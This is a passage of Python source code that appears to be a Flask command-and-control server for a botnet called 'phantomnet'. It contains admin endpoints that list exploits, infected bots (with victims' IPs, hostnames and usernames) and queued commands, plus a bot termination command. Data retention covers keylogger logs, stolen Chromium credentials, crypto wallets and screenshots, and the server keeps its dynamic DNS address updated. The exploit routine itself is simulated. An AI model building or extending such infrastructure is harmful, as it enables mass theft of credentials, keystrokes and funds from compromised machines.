        if 'windows' in target['os_info'].lower():
            exploit_method = 'windows_exploit'
        elif 'linux' in target['os_info'].lower():
            exploit_method = 'linux_exploit'
        elif 'mac' in target['os_info'].lower():
            exploit_method = 'macos_exploit'
        
        # In a real implementation, this would actually attempt to exploit the target
        # For this example, we'll simulate success based on random chance and target reputation
        success_chance = 0.7  # 70% base success rate
        return random.random() < success_chance
    
    except Exception as e:
        logging.error(f"Exploitation attempt failed: {e}")
        return False

@app.route('/admin/exploits', methods=['GET'])
def list_exploits():
    if 'admin_logged_in' not in session:
        return jsonify({'error': 'Unauthorized'}), 401
    
    exploits = Exploit.query.all()
    return jsonify([{
        'id': exploit.id,
        'name': exploit.name,
        'type': exploit.exploit_type,
        'platform': exploit.target_platform,
        'cve': exploit.cve_id,
        'success_rate': exploit.success_rate
    } for exploit in exploits])

@app.route('/admin/tasks', methods=['GET'])
def list_tasks():
    if 'admin_logged_in' not in session:
        return jsonify({'error': 'Unauthorized'}), 401
    
    tasks = Task.query.order_by(Task.created_at.desc()).limit(50).all()
    return jsonify([{
        'id': task.id,
        'bot_id': task.bot_id,
        'type': task.task_type,
        'command': task.command,
        'status': task.status,
        'created_at': task.created_at.isoformat(),
        'execution_time': task.execution_time
    } for task in tasks])

@app.route('/admin/bots', methods=['GET'])
def list_bots():
    if 'admin_logged_in' not in session:
        return jsonify({'error': 'Unauthorized'}), 401
    
    bots = Bot.query.all()
    return jsonify([{
        'id': bot.id,
        'ip': bot.ip_address,
        'hostname': bot.hostname,
        'os': bot.os_info,
        'user': bot.username,
        'registered': bot.registered_at.isoformat(),
        'last_seen': bot.last_seen.isoformat() if bot.last_seen else None,
        'status': bot.status,
        'capabilities': json.loads(bot.capabilities) if bot.capabilities else {}
    } for bot in bots])

@app.route('/admin/bots//terminate', methods=['POST'])
def terminate_bot(bot_id):
    if 'admin_logged_in' not in session:
        return jsonify({'error': 'Unauthorized'}), 401
    
    bot = Bot.query.get(bot_id)
    if not bot:
        return jsonify({'error': 'Bot not found'}), 404
    
    # Create termination command
    command_id = secrets.token_urlsafe(16)
    command = Command(
        id=command_id,
        bot_id=bot_id,
        command='terminate',
        status='pending'
    )
    
    db.session.add(command)
    db.session.commit()
    
    return jsonify({'status': 'success', 'command_id': command_id})

# Background tasks
def background_tasks():
    """Run background tasks periodically"""
    while True:
        try:
            # Update DuckDNS
            server.update_duckdns()
            
            # Clean up old data
            cutoff = datetime.now() - timedelta(days=30)
            Command.query.filter(Command.timestamp < cutoff).delete()
            SystemInfo.query.filter(SystemInfo.timestamp < cutoff).delete()
            NetworkScan.query.filter(NetworkScan.timestamp < cutoff).delete()
            ProcessList.query.filter(ProcessList.timestamp < cutoff).delete()
            FileSystem.query.filter(FileSystem.timestamp < cutoff).delete()
            RegistryData.query.filter(RegistryData.timestamp < cutoff).delete()
            Screenshot.query.filter(Screenshot.timestamp < cutoff).delete()
            KeyloggerData.query.filter(KeyloggerData.timestamp < cutoff).delete()
            ChromiumCredentials.query.filter(ChromiumCredentials.timestamp < cutoff).delete()
            CryptoWallet.query.filter(CryptoWallet.timestamp < cutoff).delete()
            db.session.commit()
            
            # Check for inactive bots
            inactive_cutoff = datetime.now() - timedelta(hours=2)
            Bot.query.filter(Bot.last_seen < inactive_cutoff).update({'status': 'inactive'})
            db.session.commit()
            
        except Exception as e:
            logging.error(f"Background task error: {e}")
        
        # Run every 5 minutes
        time.sleep(300)

# Start background tasks in a separate thread
background_thread = threading.Thread(target=background_tasks, daemon=True)
background_thread.start()

if __name__ == '__main__':
    # Create database tables
    with app.app_context():
        db.create_all()
        
        # Create default admin if not exists
        if not Admin.query.filter_by(username='admin').first():
            admin = Admin(
                username='admin',
                password_hash=generate_password_hash('phantom_admin_2024'),
                email='admin@phantomnet.com'
            )
            db.session.add(admin)
            db.session.commit()

        # Initialize DuckDNS configuration
        if not DuckDNSUpdater.query.first():
            duckdns = DuckDNSUpdater(
                domain='your-domain',
                token='your-token',
                is_active=False
            )
            db.session.add(duckdns)
            db.session.commit()
    
    # Run the Flask application server
    app.run(
        host='0.0.0.0',
        port=8443,
        ssl_context='adhoc',  # Note: Use proper SSL certificates in production environment
        threaded=True,        # Enable multi-threading to handle multiple bot connections
        debug=False           # Disable debug mode in production for security
    )
